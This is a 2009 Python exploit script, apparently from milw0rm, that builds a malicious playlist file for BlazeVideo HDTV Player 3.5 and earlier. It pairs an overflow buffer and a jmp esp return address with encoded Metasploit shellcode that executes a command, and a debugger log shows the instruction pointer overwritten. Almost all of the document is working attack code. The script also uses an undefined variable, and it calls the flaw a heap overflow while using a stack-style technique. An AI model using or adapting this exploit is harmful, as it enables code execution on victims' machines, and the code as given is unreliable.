#!/usr/bin/python
#
# Title: BlazeVideo HDTV Player <= 3.5 PLF Playlist File  Remote Heap Overflow Exploit
#
# Summary: BlazeVideo HDTV Player (BlazeDTV) is a full-featured and easy-to-use HDTV
# Player software, combining HDTV playback, FM receiving, video record and DVD playback
# functions. You can make advantage of PC monitor's high resolution, watch, record, playback
# high definition HDTV program or teletext broadcast program.
#
# Product web page: http://www.blazevideo.com/hdtv-player/index.htm
#
# Tested on Microsoft Windows XP Professional SP2 (English)
#
# ------------------------------------windbg------------------------------------
#
# (620.d74): Access violation - code c0000005 (first chance)
# First chance exceptions are reported before any exception handling.
# This exception may be expected and handled.
# eax=00000001 ebx=77f6c15c ecx=04eb0dc0 edx=00000042 esi=0266ffc0 edi=00000001
# eip=43434343 esp=0013f288 ebp=6405247c iopl=0         nv up ei pl nz ac pe nc
# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010216
# 43434343 ??              ???
#
#--------------------------------------------------------------------------------
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#
# liquidworm [t00t] gmail [w00t] com
#
# http://www.zeroscience.org/
#
# 03.01.2009
#


print "--------------------------------------------------------------------------"
print " BlazeVideo HDTV Player <= 3.5 Playlist File Remote Heap Overflow Exploit\n"
print "\t\t\tby LiquidWorm [liquidworm[t00t]gmail.com] - 2009\n"
print "--------------------------------------------------------------------------"

buffer = "\x41" * 260

eip = "\xc0\x25\x49\x7e" #jmp esp  user32.dll

nop = "\x90" * 15

# win32_exec -  EXITFUNC=thread CMD=sol Size=328 Encoder=Alpha2 http://metasploit.com
shellcode = (
	"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
	"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x48\x6a\x65"
	"\x58\x30\x42\x31\x50\x42\x41\x6b\x41\x41\x75\x32\x41\x42\x32\x42"
	"\x41\x30\x42\x41\x41\x58\x38\x41\x42\x50\x75\x39\x79\x6b\x4c\x4a"
	"\x48\x47\x34\x43\x30\x45\x50\x57\x70\x4c\x4b\x71\x55\x77\x4c\x4c"
	"\x4b\x71\x6c\x37\x75\x30\x78\x75\x51\x78\x6f\x4c\x4b\x52\x6f\x32"
	"\x38\x4c\x4b\x63\x6f\x45\x70\x55\x51\x5a\x4b\x31\x59\x6c\x4b\x44"
	"\x74\x6c\x4b\x55\x51\x4a\x4e\x76\x51\x49\x50\x6d\x49\x4c\x6c\x4e"
	"\x64\x6f\x30\x30\x74\x43\x37\x7a\x61\x59\x5a\x36\x6d\x46\x61\x6a"
	"\x62\x58\x6b\x7a\x54\x45\x6b\x76\x34\x47\x54\x64\x44\x53\x45\x79"
	"\x75\x4c\x4b\x63\x6f\x51\x34\x67\x71\x4a\x4b\x50\x66\x4c\x4b\x76"
	"\x6c\x30\x4b\x4c\x4b\x43\x6f\x67\x6c\x34\x41\x58\x6b\x6e\x6b\x75"
	"\x4c\x6c\x4b\x37\x71\x38\x6b\x6c\x49\x63\x6c\x54\x64\x44\x44\x79"
	"\x53\x50\x31\x69\x50\x63\x54\x4c\x4b\x63\x70\x34\x70\x4b\x35\x4f"
	"\x30\x53\x48\x56\x6c\x6e\x6b\x71\x50\x76\x6c\x4c\x4b\x34\x30\x45"
	"\x4c\x4c\x6d\x4e\x6b\x50\x68\x55\x58\x5a\x4b\x54\x49\x4c\x4b\x6f"
	"\x70\x4e\x50\x55\x50\x63\x30\x75\x50\x4c\x4b\x72\x48\x55\x6c\x71"
	"\x4f\x45\x61\x39\x66\x41\x70\x72\x76\x4f\x79\x6b\x48\x4d\x53\x4f"
	"\x30\x73\x4b\x50\x50\x50\x68\x6a\x4f\x48\x4e\x6d\x30\x43\x50\x62"
	"\x48\x6f\x68\x4b\x4e\x4f\x7a\x74\x4e\x46\x37\x39\x6f\x69\x77\x41"
	"\x63\x50\x6f\x70\x6c\x75\x50\x65"
	)

payload = garbage + eip + nop + shellcode + nop

try:
	out_file = open("Groundhog_Day.plf",'w')
	out_file.write(payload)
	out_file.close()
	raw_input("\n\n[*] Evil playlist successfully created.\n\nPress any key to continue...")
except:
	print "Oops!"

# milw0rm.com [2009-02-04]
